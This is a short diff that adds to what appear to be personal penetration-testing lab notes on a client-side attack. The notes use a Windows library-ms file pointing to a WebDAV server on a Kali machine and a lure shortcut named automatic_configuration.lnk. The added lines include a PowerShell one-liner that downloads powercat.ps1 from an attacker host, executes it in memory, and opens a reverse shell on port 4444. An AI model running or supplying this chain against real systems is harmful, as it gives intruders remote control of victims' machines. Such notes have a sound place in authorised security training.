@@ -44,5 +44,13 @@ exiftool info.pdf
 
 %%  open microsoft visual studio and save above XML code as config.library-ms, it should point back to your webdav server in the kali machine %%
 
+```
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<attacker_machine>:8000/powercat.ps1');
+powercat -c <attacker_machine> -p 4444 -e powershell"
+```
 
+%% create a .lnk shortcut and name it automatic_configuration.lnk %%
 
+```
+
+```
